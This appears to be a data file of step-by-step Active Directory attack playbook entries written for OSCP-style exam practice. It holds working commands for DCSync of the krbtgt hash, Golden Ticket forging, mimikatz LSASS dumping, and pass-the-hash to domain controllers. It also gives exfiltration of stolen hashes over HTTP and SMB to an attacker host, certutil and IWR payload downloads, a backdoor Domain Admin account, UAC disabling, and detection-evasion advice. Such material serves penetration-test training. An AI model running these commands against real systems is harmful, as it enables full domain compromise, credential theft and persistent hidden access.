- WMI/PSExec shell (whoami showing SYSTEM or admin user)
- RDP desktop showing hostname, IP, username
- Proof.txt or local.txt file contents from compromised systems

SAVE ALL EVIDENCE:
mkdir -p /home/kali/exam_evidence/dcsync_mass_extraction
cp -r /home/kali/loot/dcsync_[date]/* /home/kali/exam_evidence/dcsync_mass_extraction/
scrot -s /home/kali/exam_evidence/dcsync_mass_extraction/screenshots/

TIME ESTIMATE: 10-15 minutes (comprehensive documentation and evidence collection).","",""
"verify-replication-rights","Verify DCSync Permissions and Prerequisites","Confirm compromised account has replication rights required for DCSync attack","PREREQUISITES CHECK: DCSync requires Domain Admin OR Domain User with specific replication permissions.

REQUIRED PERMISSIONS:
(1) DS-Replication-Get-Changes (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
(2) DS-Replication-Get-Changes-All (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
(3) Optional: DS-Replication-Get-Changes-In-Filtered-Set (for RODC environments)

VERIFICATION METHODS:

LINUX (Impacket): Test directly with secretsdump - if successful, rights confirmed.
impacket-secretsdump -just-dc-user krbtgt '<DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP>'
SUCCESS: Outputs krbtgt NTLM hash → Rights confirmed.
FAILURE: ERROR_ACCESS_DENIED or rpc_s_access_denied → Insufficient rights.

WINDOWS (PowerView): Get-DomainObjectAcl -Identity ""DC=domain,DC=com"" -ResolveGUIDs | ?{$_.ObjectAceType -match ""Replication""}
Look for: Replication-Get-Changes and Replication-Get-Changes-All for compromised user.

CONNECTIVITY TEST: Verify DC reachable on required ports.
sudo nmap -p 445,135,139 -Pn -v <DC_IP>
EXPECTED: 445/tcp open (SMB), 135/tcp open (RPC), 139/tcp open (NetBIOS).

OPSEC: Rights verification does NOT trigger alerts - only actual DCSync attempt (step 2) creates Event 4662.

FAILURE SCENARIOS:
- ERROR_ACCESS_DENIED → Account lacks replication rights (need Domain Admin or add rights manually)
- Connection timeout → Firewall blocking SMB/RPC ports
- KRB_AP_ERR_SKEW → Time sync issue (fix: sudo ntpdate <DC_IP>)

TIME ESTIMATE: 2-5 minutes.","",""
"dcsync-krbtgt-hash","Extract krbtgt Account Hash via DCSync","Use DCSync attack to extract krbtgt account NTLM hash and Domain SID for Golden Ticket creation","KRBTGT ACCOUNT: Special domain account used to sign all Kerberos TGTs. Compromising krbtgt hash = ability to forge any Kerberos ticket for any user (including Domain Admin, Enterprise Admin, disabled accounts).

DCSYNC COMMAND (Impacket - RECOMMENDED):
impacket-secretsdump -just-dc-user krbtgt '<DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP>'

Flags explained:
-just-dc-user krbtgt: Extract ONLY krbtgt account (faster, less noisy than full dump)
-outputfile: Optional - save to file for transfer/backup

ALTERNATIVE (Mimikatz on Windows):
lsadump::dcsync /domain:<DOMAIN> /user:krbtgt

OUTPUT ANALYSIS:
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9b30e5b0dc865eadcea9411e4ade72d:::
         ^^^ RID                                 ^^^ NTLM hash (THIS IS GOLDEN TICKET KEY)

DOMAIN SID EXTRACTION: Look for line like:
[*] Domain SID: S-1-5-21-1234567890-1234567890-1234567890
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ Save this - required for Golden Ticket

CRITICAL: Document BOTH values:
(1) krbtgt NTLM hash: a9b30e5b0dc865eadcea9411e4ade72d
(2) Domain SID: S-1-5-21-1234567890-1234567890-1234567890

OPSEC CONSIDERATIONS:
- DCSync generates EventID 4662 on DC (Object Access - Replication Activity)
- Replication from non-DC system is HIGHLY suspicious
- BLUE TEAM DETECTION: Replication request from workstation IP, not DC IP
- TIMING: Execute during business hours (0900-1700) to blend with legitimate admin activity
- ALTERNATIVE: If stealth critical, extract NTDS.dit via VSS shadow copy instead (different detection signature)

FAILURE SCENARIOS:
- ERROR_DS_DRA_ACCESS_DENIED → Account lacks replication rights (return to step 1)
- krbtgt account not found → Wrong domain name specified
- Connection lost → Network instability or IDS/IPS blocking

TIME ESTIMATE: 10-30 seconds (single user extraction is fast).","",""
"transfer-hashes-to-kali","Transfer Hashes to Kali (If Extracted on Windows)","Move DCSync output from Windows system to Kali Linux for Golden Ticket creation with Impacket","SKIP IF: DCSync executed on Kali Linux directly (impacket-secretsdump).
Proceed directly to step 4 (create-golden-ticket).

REQUIRED IF: DCSync executed on compromised Windows system (Mimikatz lsadump::dcsync).
Must transfer krbtgt hash and Domain SID to Kali for ticketer.py.

FILE TO TRANSFER: Save DCSync output to text file:
C:\\temp\\krbtgt_hash.txt containing:
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9b30e5b0dc865eadcea9411e4ade72d:::
Domain SID: S-1-5-21-1234567890-1234567890-1234567890

TRANSFER METHODS:

(1) IMPACKET SMB SERVER (RECOMMENDED):
Kali: sudo impacket-smbserver -smb2support -username transfer -password 'TransferPass123!' share /home/kali/loot
Windows: net use \\\\<KALI_IP>\\share /user:transfer TransferPass123!
         copy C:\\temp\\krbtgt_hash.txt \\\\<KALI_IP>\\share\
Windows: net use \\\\<KALI_IP>\\share /delete

(2) BASE64 ENCODE (No SMB connectivity):
Windows: certutil -encode C:\\temp\\krbtgt_hash.txt C:\\temp\\hash.b64
         type C:\\temp\\hash.b64
Copy output, paste on Kali:
Kali: cat > hash.b64 << 'EOF'
<paste Base64 content>
EOF
base64 -d hash.b64 > krbtgt_hash.txt

(3) HTTP EXFILTRATION:
Kali: python3 -m http.server 8000 (setup simple HTTP server)
Windows: curl http://<KALI_IP>:8000/upload -F ""file=@C:\\temp\\krbtgt_hash.txt"" -X POST
OR: Invoke-WebRequest -Uri http://<KALI_IP>:8000 -Method POST -InFile C:\\temp\\krbtgt_hash.txt

(4) MANUAL COPY (Last resort):
Copy hash and SID manually via RDP clipboard, terminal copy/paste.

VALIDATION: Verify file integrity on Kali:
cat krbtgt_hash.txt
Confirm: NTLM hash (32 hex chars) and Domain SID present.

OPSEC: SMB server method creates network traffic. Use encrypted channel if IDS/IPS monitoring active.

TIME ESTIMATE: 1-2 minutes.","",""
"create-golden-ticket","Forge Golden Ticket with Impacket ticketer.py","Create forged Kerberos TGT using krbtgt NTLM hash for persistent domain-wide access","GOLDEN TICKET THEORY: Normal Kerberos auth: User requests TGT from KDC (signed with krbtgt hash) → User presents TGT to request service tickets. Golden Ticket: Attacker creates FAKE TGT signed with stolen krbtgt hash → Domain trusts ticket (valid signature) → No KDC contact needed → Access any service as any user.

IMPACKET TICKETER COMMAND:
impacket-ticketer -nthash <KRBTGT_NTLM> -domain-sid <DOMAIN_SID> -domain <DOMAIN_FQDN> <USERNAME>

PARAMETERS:
-nthash: krbtgt NTLM hash from step 2 (32 hex characters)
-domain-sid: Domain SID from step 2 (S-1-5-21-...)
-domain: Target domain FQDN (e.g., corp.com)
<USERNAME>: User to impersonate (e.g., Administrator, Domain Admin username)

OPTIONAL FLAGS (Advanced OPSEC):
-duration <HOURS>: Ticket lifetime (default: 87600 hours = 10 years). Use realistic value for stealth: 10 hours.
-user-id <RID>: User RID (default: 500 = Administrator). Match real user RID for stealth.
-groups <RIDS>: Group memberships (default: 512,513,518,519,520 = Domain Admins, Domain Users, Schema Admins, Enterprise Admins, Group Policy Admins).

EXAMPLE (Realistic OPSEC-aware ticket):
impacket-ticketer -nthash a9b30e5b0dc865eadcea9411e4ade72d -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain corp.com -duration 10 -user-id 1104 Dave

OUTPUT:
[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for corp.com/Dave
[*] Signing/Encrypting final ticket
[*]   PAC_LOGON_INFO
[*]   EncTicketPart
[*] Saving ticket in Dave.ccache
          ^^^ OUTPUT FILE (Kerberos credential cache)

CRITICAL: ticketer.py creates .ccache file (e.g., Administrator.ccache, Dave.ccache).
This file contains the forged TGT.

OPSEC STEALTH TECHNIQUES:
(1) Impersonate EXISTING user (not disabled/deleted accounts) - query with: net user /domain OR ldapsearch
(2) Use realistic ticket lifetime (10 hours, not 10 years) - matches domain policy
(3) Match real user RID - extract with: rpcclient -U ""user%pass"" -c ""lookupnames username"" <DC_IP>
(4) Forge ticket for standard user FIRST (test), then escalate to Domain Admin if detected

DETECTION INDICATORS (Blue Team perspective):
- TGT lifetime exceeds domain policy maximum (e.g., 10 years vs 10 hours)
- TGT for disabled/deleted user accounts
- TGT with unusual group memberships (e.g., all admin groups)
- TGT issued outside of DC issuing patterns

TIME ESTIMATE: 5-10 seconds (ticket creation is instant).","",""
"export-ticket-to-environment","Export Golden Ticket to Kerberos Environment","Load forged TGT into Kerberos credential cache for use with Impacket tools","KERBEROS CREDENTIAL CACHE: Linux Kerberos uses credential cache (ccache) to store TGTs/TGS tickets. Impacket tools (psexec, wmiexec, smbexec, secretsdump) check KRB5CCNAME environment variable for ticket location.

EXPORT COMMAND:
export KRB5CCNAME=/path/to/<USERNAME>.ccache

EXAMPLE:
export KRB5CCNAME=/home/kali/loot/Administrator.ccache

VERIFY EXPORT:
echo $KRB5CCNAME
OUTPUT: /home/kali/loot/Administrator.ccache

VIEW TICKET DETAILS (Optional verification):
klist
OUTPUT:
Ticket cache: FILE:/home/kali/loot/Administrator.ccache
Default principal: Administrator@CORP.COM

Valid starting       Expires              Service principal
11/23/2025 10:00:00  11/23/2025 20:00:00  krbtgt/CORP.COM@CORP.COM
^^^ Ticket valid     ^^^ Expiration        ^^^ Service (krbtgt = TGT)

IMPORTANT: KRB5CCNAME is SESSION-SPECIFIC.
If you open new terminal, must re-export.
OR: Add to ~/.bashrc for persistence: echo 'export KRB5CCNAME=/path/to/ticket.ccache' >> ~/.bashrc

ALTERNATIVE METHODS:

(1) Copy to default ccache location:
cp Administrator.ccache /tmp/krb5cc_$(id -u)
export KRB5CCNAME=/tmp/krb5cc_$(id -u)

(2) Use -k flag directly (some Impacket tools):
impacket-psexec -k -no-pass corp.com/Administrator@DC01.corp.com
(Note: Still requires KRB5CCNAME set OR ticket in default location)

KERBEROS CONFIGURATION: Some environments require /etc/krb5.conf configuration:
[libdefaults]
    default_realm = CORP.COM
    dns_lookup_kdc = true
    dns_lookup_realm = false

[realms]
    CORP.COM = {
        kdc = dc01.corp.com
        admin_server = dc01.corp.com
    }

Edit if klist or Impacket tools show ""KDC not found"" errors.

TIME ESTIMATE: 30 seconds.","",""
"validate-golden-ticket-access","Validate Golden Ticket with Impacket Tools","Confirm Golden Ticket works by authenticating to domain resources and executing commands as forged user","VALIDATION STRATEGY: Test Golden Ticket against multiple domain resources to confirm ticket validity and domain-wide access.

TEST 1: SECRETSDUMP (Domain credential dump - requires Domain Admin rights)
impacket-secretsdump -k -no-pass '<DOMAIN>/<USERNAME>@<DC_FQDN>'

Flags:
-k: Use Kerberos authentication (reads ticket from KRB5CCNAME)
-no-pass: Don't prompt for password (using ticket auth)
<DC_FQDN>: MUST be FQDN (dc01.corp.com), not IP (Kerberos requires hostnames)

SUCCESS OUTPUT:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:...
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:...
<hundreds of domain user hashes>

TEST 2: PSEXEC (Interactive SYSTEM shell on DC)
impacket-psexec -k -no-pass '<DOMAIN>/<USERNAME>@<DC_FQDN>'

SUCCESS: Drops to C:\\Windows\\system32> prompt with SYSTEM privileges.
Test: whoami → nt authority\\system
      hostname → DC01

TEST 3: WMIEXEC (Stealthy semi-interactive shell)
impacket-wmiexec -k -no-pass '<DOMAIN>/<USERNAME>@<DC_FQDN>'

SUCCESS: Drops to [*] SMB shell prompt.
Test: whoami → corp\\administrator (runs as user, not SYSTEM)

TEST 4: SMBCLIENT (Access domain shares)
impacket-smbclient -k -no-pass '<DOMAIN>/<USERNAME>@<DC_FQDN>'

SUCCESS: Lists shares (ADMIN$, C$, IPC$, NETLOGON, SYSVOL).
Test: use ADMIN$; ls (confirms admin access to C:\\Windows)

CRITICAL NOTES:
- Golden Ticket auth = NO PASSWORD NEEDED (ticket proves identity)
- MUST use FQDNs for targets (dc01.corp.com), not IPs - Kerberos requires DNS names
- Ticket allows access to ANY domain resource as forged user (DCs, member servers, workstations)
- Access persists until ticket expiration (10 hours to 10 years depending on -duration parameter)

FAILURE SCENARIOS:
- KDC_ERR_TGT_REVOKED: Ticket revoked (krbtgt password changed - rare)
- KRB_AP_ERR_SKEW: Time sync issue (ntpdate <DC_IP>)
- Connection timeout: Network/firewall issue (not auth failure)
- Access denied after successful auth: User lacks permissions (forged wrong user)

PERSISTENCE CONFIRMATION: If ALL tests succeed, Golden Ticket is fully functional.
Save .ccache file for future access (ticket valid until expiration or krbtgt password reset).

TIME ESTIMATE: 3-5 minutes (all validation tests).","",""
"assess-domain-wide-access","Assess Domain-Wide Access and Document Persistence","Verify Golden Ticket provides comprehensive domain access and document persistent access mechanisms","DOMAIN-WIDE ACCESS TESTING: Golden Ticket should grant access to ALL domain resources as the forged user. Systematically test and document access scope.

ACCESS ASSESSMENT CHECKLIST:

(1) DOMAIN CONTROLLERS:
Test: impacket-psexec -k -no-pass 'corp.com/Administrator@DC01.corp.com'
Test: impacket-psexec -k -no-pass 'corp.com/Administrator@DC02.corp.com'
Expected: SYSTEM shell on all DCs (full domain control)

(2) MEMBER SERVERS (File servers, application servers):
Enumerate: crackmapexec smb 192.168.50.0/24 -k --kdcHost DC01.corp.com
Identify domain-joined systems, test access with Golden Ticket.

(3) DOMAIN SHARES:
Test: smbclient -k -no-pass '//DC01.corp.com/SYSVOL'
Test: smbclient -k -no-pass '//DC01.corp.com/NETLOGON'
Test: smbclient -k -no-pass '//FileServer01.corp.com/SharedData'
Expected: Full read/write access to domain shares

(4) ADDITIONAL DCSYNC (Persistence validation):
Test: impacket-secretsdump -k -no-pass 'corp.com/Administrator@DC01.corp.com' -just-dc-ntlm
Expected: Ability to re-extract ALL domain credentials (confirming Domain Admin level access)

(5) LATERAL MOVEMENT:
Test: impacket-wmiexec -k -no-pass 'corp.com/Administrator@Workstation01.corp.com'
Test: impacket-wmiexec -k -no-pass 'corp.com/Administrator@SQLServer.corp.com'
Expected: Shell access on any domain-joined system

PERSISTENCE DOCUMENTATION:

SAVE GOLDEN TICKET COMPONENTS:
(1) krbtgt NTLM hash: [document hash]
(2) Domain SID: [document SID]
(3) Domain FQDN: [document domain]
(4) .ccache file: Copy to secure backup location
    cp Administrator.ccache /home/kali/persistence/corp_golden_ticket_$(date +%Y%m%d).ccache

RE-ACCESS PROCEDURE (Future use):
(1) Set environment: export KRB5CCNAME=/path/to/backup.ccache
(2) Verify ticket: klist (check expiration)
(3) Use Impacket tools with -k -no-pass flags
(4) If expired: Regenerate with saved hash/SID using ticketer.py

TICKET REGENERATION (If expired or lost):
impacket-ticketer -nthash <SAVED_HASH> -domain-sid <SAVED_SID> -domain <DOMAIN> -duration 10 Administrator
export KRB5CCNAME=Administrator.ccache

TICKET LIFETIME:
- Current ticket valid until: [check klist output]
- Maximum validity: 10 years (if -duration not specified) OR until krbtgt password reset
- krbtgt password change frequency: Typically NEVER in most orgs (only after major breach or policy mandate)
- Re-generation: Possible indefinitely as long as krbtgt hash unchanged

DETECTION EVASION:
- Avoid excessive Golden Ticket use (every auth generates logs)
- Blend with normal admin activity (execute during business hours)
- Use realistic ticket parameters (10 hour lifetime, real user RID)
- Rotate between different forged users if multiple compromised

EXAM NOTES: Document Golden Ticket creation timestamp, components, and access scope in exam report. Include:
(1) krbtgt hash extraction method (DCSync command)
(2) Golden Ticket creation command (ticketer.py)
(3) Validation commands (psexec, secretsdump)
(4) Screenshot of domain-wide access (e.g., secretsdump output showing all domain hashes)

TIME ESTIMATE: 5-10 minutes (comprehensive testing and documentation).","",""
"identify-target-systems","Identify Target Systems with Local Admin Access","Find all domain-joined systems where compromised user has local administrator privileges","Use BloodHound to identify systems where compromised user has AdminTo relationship, OR use crackmapexec to enumerate access across the domain.

BloodHound Method (Preferred):
1. Mark compromised user as owned in BloodHound GUI
2. Run custom Cypher query: MATCH (u:User {name:'USER@DOMAIN.COM'})-[:AdminTo]->(c:Computer) RETURN u,c
3. Graph view shows all systems with local admin access
4. Prioritize workstations over servers (more likely to have service sessions)

Crackmapexec Method (Manual enumeration):
1. Run: crackmapexec smb 10.10.10.0/24 -u username -p password --local-auth
2. Look for 'Pwn3d!' indicator showing local admin access
3. Save list of accessible systems for further enumeration

Target Selection Criteria:
- Domain-joined workstations (not standalone)
- Systems with uptime >7 days (more likely to have cached credentials)
- Systems used by IT/helpdesk (higher privilege accounts)
- Systems running monitoring agents or backup software

Expected Output:
List of 5-20 systems with local admin access. Even ONE system with service session is sufficient for domain compromise.

CRITICAL: Don't stop at first system - service sessions are NOT guaranteed on every workstation. Be prepared to check 3-5 systems.","",""
"check-for-service-sessions","Check for Domain Admin Service Sessions","Identify which accessible systems have Domain Admin service sessions cached in memory","Use BloodHound HasSession query OR manual enumeration to identify systems with high-value sessions.

BloodHound Method (Fastest):
1. Run query: MATCH (c:Computer)<-[:HasSession]-(u:User) WHERE u.name CONTAINS 'ADMIN' RETURN c,u
2. Filter for Domain Admin accounts (check group membership)
3. Cross-reference with systems from step 1 (where you have local admin)
4. Target: Systems where you have BOTH local admin AND DA service session

Manual Method (If BloodHound unavailable):
1. Connect to each system with local admin access
2. Run: net sessions (shows active sessions - unreliable for service sessions)
3. Run: query user (shows interactive sessions - NOT service sessions)
4. Proceed to credential dump on ALL accessible systems (service sessions not visible externally)

Target Indicators:
- Systems running SCOM, Nagios, SolarWinds (monitoring as Domain Admin)
- Systems with Veeam, Commvault, Backup Exec (backup as Domain Admin)
- Systems with scheduled tasks (check Task Scheduler for DA accounts)
- Domain Controllers (always have service sessions, but harder to compromise)

IMPORTANT: Service sessions are NOT visible via 'net sessions' or 'query user'. The ONLY way to confirm is credential dump with mimikatz. BloodHound HasSession query is based on Kerberos tickets, which ARE visible remotely.

If BloodHound shows no HasSession relationships for Domain Admins:
- Proceed anyway - BloodHound data may be stale
- Target systems with high uptime
- Check multiple systems (service sessions are common but not guaranteed)","",""
"lateral-movement","Lateral Movement to Target System","Establish interactive session on target system to perform credential harvesting","Use Evil-WinRM (preferred) or PSExec to connect to target system with local admin credentials.

Evil-WinRM Method (Preferred for OSCP):
1. Syntax: evil-winrm -i <TARGET_IP> -u '<DOMAIN>\<USERNAME>' -p '<PASSWORD>'
2. Alternative (Pass-the-Hash): evil-winrm -i <TARGET_IP> -u '<DOMAIN>\<USERNAME>' -H <NTLM_HASH>
3. Verify access: whoami, hostname, whoami /groups
4. Check privileges: whoami /priv (should show SeDebugPrivilege available)

PSExec Method (Alternative):
1. Syntax: impacket-psexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
2. Gets SYSTEM shell directly (no need for privilege escalation)
3. Less stealthy (creates service, writes to disk)

Connection Troubleshooting:
- WinRM not enabled: Try PSExec, SMB, or RDP instead
- Authentication fails: Verify credentials with crackmapexec first
- Network unreachable: Check routing, pivoting requirements
- AV blocks connection: Use obfuscated tools or SOCKS proxy

CRITICAL SYNTAX: Evil-WinRM requires 'DOMAIN\user' format (NOT -d flag). Single quotes around username to escape backslash in bash.

Expected Session:
- Interactive PowerShell prompt (Evil-WinRM) OR cmd prompt (PSExec)
- Confirm username and hostname match target system
- Verify local admin by checking C:\Windows\System32 write access","",""
"upload-mimikatz","Upload Mimikatz to Target System","Transfer mimikatz binary to writable directory on target system","Upload mimikatz.exe to target system using Evil-WinRM file upload functionality OR alternative transfer methods.

Evil-WinRM Upload (Easiest):
1. From Evil-WinRM session: cd C:\temp (or C:\Users\Public, C:\Windows\temp)
2. Upload mimikatz: upload /path/to/mimikatz.exe
3. Verify upload: dir mimikatz.exe (confirm file size ~1.2 MB)
4. Test execution: .\mimikatz.exe ""exit"" (should run without error)

Alternative Transfer Methods:
1. SMB Copy: copy \\<ATTACKER_IP>\share\mimikatz.exe C:\temp\
2. PowerShell Download: IWR -Uri http://<ATTACKER_IP>/mimikatz.exe -OutFile C:\temp\mimikatz.exe
3. Base64 Encoding: Split large file into chunks, decode on target
4. Certutil: certutil -urlcache -split -f http://<ATTACKER_IP>/mimikatz.exe C:\temp\mimikatz.exe

Antivirus Evasion:
- Use obfuscated mimikatz (mimikatz_trunk.7z from GitHub, extract and rename)
- Use pypykatz (Python alternative, requires Python on target)
- Use Invoke-Mimikatz (in-memory PowerShell, no disk write)
- Use procdump + offline parsing (dump LSASS, parse locally with pypykatz)

Writable Directories (Priority Order):
1. C:\temp (may not exist, create first: mkdir C:\temp)
2. C:\Users\Public
3. C:\Windows\temp (requires higher privileges)
4. C:\Users\<USERNAME>\AppData\Local\Temp

IMPORTANT: If AV deletes mimikatz immediately after upload, use alternative methods. Many OSCP labs have AV disabled, but real environments often don't.","",""
"enable-debug-privilege","Enable SeDebugPrivilege","Enable SeDebugPrivilege token required for LSASS memory access","Run mimikatz 'privilege::debug' command to enable SeDebugPrivilege. This is MANDATORY before any sekurlsa commands.

Command Execution:
1. Run: .\mimikatz.exe ""privilege::debug"" ""exit""
2. Expected output: 'Privilege '20' OK' (indicates SeDebugPrivilege enabled)
3. If fails: Check if local admin (whoami /priv should show SeDebugPrivilege)

WHY THIS IS MANDATORY:
Even local administrators don't automatically have SeDebugPrivilege ENABLED. The privilege exists in the token but is disabled by default. Mimikatz 'privilege::debug' enables it. Without this:
- sekurlsa::logonpasswords returns 'ERROR 0x00000005 Access Denied'
- LSASS memory is protected, mimikatz cannot read credentials
- #1 mimikatz failure in OSCP exams

Troubleshooting:
- 'Privilege '20' KO': Not local administrator, or UAC blocking privilege elevation
- UAC enabled: Run mimikatz from elevated prompt, or disable UAC temporarily
- SeDebugPrivilege not in token: User not in Administrators group, recheck access

Alternative if privilege::debug fails:
- Use PSExec to get SYSTEM shell (SYSTEM always has SeDebugPrivilege)
- Disable UAC: reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f (requires reboot)
- Use procdump to dump LSASS, parse offline (doesn't require SeDebugPrivilege on target)

Verification:
Run: whoami /priv
Look for: SeDebugPrivilege                  Enabled
If shows 'Disabled', mimikatz privilege::debug should enable it.","",""
"dump-lsass-credentials","Dump LSASS Credentials with Mimikatz","Extract all cached credentials from LSASS memory including service sessions","Use mimikatz sekurlsa::logonpasswords to dump all credentials cached in LSASS memory, then parse output to identify Domain Admin service sessions.

Command Execution:
1. Run: .\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" ""exit"" > output.txt
2. Wait 5-10 seconds (LSASS dump takes time on busy systems)
3. Download results: download output.txt (Evil-WinRM) OR copy to share
4. Parse output locally for analysis

Expected Output Structure:
Authentication Id : 0 ; 12345678
Session           : Service from 0
User Name         : administrator
Domain            : CORP
Logon Server      : DC01
NTLM              : a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
SHA1              : ...

KEY INDICATORS FOR SERVICE SESSIONS:
- 'Session: Service from 0' (NOT 'Interactive from 2' or 'RemoteInteractive from 10')
- These sessions persist until reboot (hours/days/weeks)
- Cached when service starts, credentials remain in memory until service stops

Parsing Strategy:
1. Search for 'Service from 0' sessions first (highest priority)
2. Extract NTLM hashes for those sessions
3. Map usernames to Domain Admin group (check with 'net group ""Domain Admins"" /domain')
4. Ignore interactive sessions (less reliable, log out quickly)

Common Output Patterns:
- Multiple entries for same user (different logon sessions)
- Service sessions have Logon Server = DC (Domain Controller)
- Standard users also appear (filter for admin accounts)

Troubleshooting:
- ERROR 0x00000005: Forgot privilege::debug (run step 5 again)
- No output: LSASS protected (credential guard enabled), use alternative
- Only computer accounts: No user sessions cached, try different system
- Empty NTLM fields: WDigest disabled (Windows 8.1+), use Kerberos tickets instead","",""
"extract-service-session-creds","Extract and Validate Service Session Credentials","Parse mimikatz output to extract Domain Admin credentials and validate they work","Parse mimikatz output to extract NTLM hashes from service sessions, map to Domain Admin accounts, and validate credentials.

Parsing Steps:
1. Open output.txt from step 6
2. Search for 'Session           : Service from 0'
3. Extract User Name, Domain, NTLM hash from that section
4. Repeat for all service sessions in output
5. Build credential list: DOMAIN\username:NTLMhash

Mapping to Domain Admins:
1. Check group membership: net group ""Domain Admins"" /domain
2. Cross-reference extracted usernames with Domain Admins list
3. Prioritize: Domain Admins > Enterprise Admins > Local Admins with domain access

Validation with Crackmapexec:
1. Test each extracted hash: crackmapexec smb <DC_IP> -u <username> -H <NTLM_hash> -d <DOMAIN>
2. Look for 'Pwn3d!' indicator (confirms Domain Admin)
3. If fails: Credential may be stale, service account may be disabled, wrong domain

Example Extraction:
Input (mimikatz):
```
Authentication Id : 0 ; 123456
Session           : Service from 0
User Name         : svc_backup
Domain            : CORP
NTLM              : a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
```

Output (credential):
CORP\svc_backup:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6

Validation:
crackmapexec smb 10.10.10.10 -u svc_backup -H a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 -d CORP
Expected: '[+] CORP\svc_backup:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 (Pwn3d!)'

Troubleshooting:
- Validation fails but hash correct: Account may require interactive logon, try different DC
- Multiple service sessions found: Test ALL of them (some may be disabled accounts)
- Hash format wrong: Ensure 32 characters (NTLM), not 40 (SHA1) or 64 (SHA256)
- Pwn3d not showing: May still be valid user, just not Domain Admin (check group membership)","",""
"escalate-to-domain-admin","Escalate to Domain Admin Access","Use harvested credentials to access Domain Controller and retrieve flags","Use extracted Domain Admin credentials to access Domain Controller via Pass-the-Hash and retrieve proof of compromise.

Access Methods:
1. Evil-WinRM PTH: evil-winrm -i <DC_IP> -u Administrator -H <NTLM_HASH>
2. PSExec PTH: impacket-psexec -hashes :<NTLM_HASH> <DOMAIN>/Administrator@<DC_IP>
3. WMI PTH: impacket-wmiexec -hashes :<NTLM_HASH> <DOMAIN>/Administrator@<DC_IP>
4. RDP (if enabled): xfreerdp /u:Administrator /pth:<NTLM_HASH> /v:<DC_IP>

Verification Steps:
1. Connect to DC with harvested credentials
2. Verify access: whoami (should be DOMAIN\Administrator or service account)
3. Confirm domain rights: net group ""Domain Admins"" /domain (verify membership)
4. Check DC hostname: hostname (confirm you're on Domain Controller)

Flag Retrieval:
1. Navigate to C:\Users\Administrator\Desktop
2. Read flag: type proof.txt OR type flag.txt
3. Document access: whoami /all > proof_of_access.txt
4. Download proof: download proof_of_access.txt (for writeup evidence)

Additional Actions (Post-Exploitation):
1. DCSync full domain: impacket-secretsdump -hashes :<NTLM_HASH> <DOMAIN>/Administrator@<DC_IP>
2. Golden Ticket creation: Extract krbtgt hash for persistence
3. Create additional Domain Admin: net user backdoor Password123! /add /domain && net group ""Domain Admins"" backdoor /add /domain
4. Exfiltrate AD database: ntdsutil ""ac i ntds"" ""i f m"" ""cr fu C:\temp"" q q

CRITICAL: Document EVERYTHING for writeup:
- Exact command used for access
- Proof of Domain Admin (whoami /all output)
- Flag contents
- Timeline (time from initial access to DA compromise)

SUCCESS: You've escalated from local admin on workstation to Domain Admin by exploiting cached service session. Total time: ~15 minutes.","",""
"verify-domain-access","Verify Domain Access and Time Synchronization","Confirm network connectivity to domain controller and synchronize system time to avoid Kerberos errors","REQUIREMENTS: Network access to DC (Kerberos port 88 for Linux OR RDP/WinRM for Windows).

LINUX TIME SYNC: Kerberos requires <5 minute clock difference.
Use ntpdate or rdate to sync with DC: sudo ntpdate <DC_IP> OR sudo rdate -n <DC_IP>.
Verification: date (shows system time).
Compare with DC time.

WINDOWS: Time sync handled automatically on domain-joined systems (no action needed).

CONNECTIVITY TEST: Linux → sudo nmap -p 88 -Pn -sU -v <DC_IP> (verify UDP 88 open/filtered).
Windows → test-netconnection <DC_IP> -port 88 (verify connectivity).

CRITICAL: If time sync fails, Kerberos will return KRB_AP_ERR_SKEW error and attack cannot proceed.","",""
"identify-vulnerable-users","Enumerate Users with Preauthentication Disabled","Identify all users with DONT_REQ_PREAUTH flag (vulnerable to AS-REP roasting)","LINUX AUTHENTICATED: impacket-GetNPUsers -dc-ip <DC_IP> <DOMAIN>/<USERNAME> (no -request flag = enumeration only).
Requires valid domain credentials.

LINUX UNAUTHENTICATED: impacket-GetNPUsers -usersfile <USERLIST> -dc-ip <DC_IP> <DOMAIN>/ -no-pass (requires username wordlist, rare to succeed).

WINDOWS: Rubeus.exe asreproast /nowrap (uses current user context, no credentials needed) OR PowerView Get-DomainUser -PreauthNotRequired.

OUTPUT ANALYSIS: Name (username), MemberOf (group membership - prioritize admin groups), PasswordLastSet (old dates = weak passwords), UAC (0x410200 = preauthentication disabled).

EXPECTED RESULTS: 0-5 vulnerable users typical.
0 users = NORMAL (preauthentication enabled by default).
>5 users = misconfigured environment or many legacy accounts.

TIME ESTIMATE: <5 seconds for enumeration.","",""
"extract-asrep-hashes","Request and Extract AS-REP Hashes","Request AS-REP responses and extract encrypted hashes for offline cracking","LINUX: impacket-GetNPUsers -dc-ip <DC_IP> -request -outputfile hashes.asreproast <DOMAIN>/<USERNAME>.
The -request flag triggers TGT requests for all vulnerable users.
-outputfile saves hashes in Hashcat mode 18200 format.

WINDOWS: Rubeus.exe asreproast /nowrap /outfile:C:\hashes.asreproast.
The /nowrap flag prevents line breaks in hash (Hashcat requires single-line format).
/outfile saves hashes to file.

HASH FORMAT: $krb5asrep$23$user@DOMAIN.COM:hash_data.
The '23' indicates etype 23 (RC4-HMAC).

CRITICAL: If step 2 found 0 vulnerable users, this step will return 'No entries' - this is EXPECTED and NOT a failure.
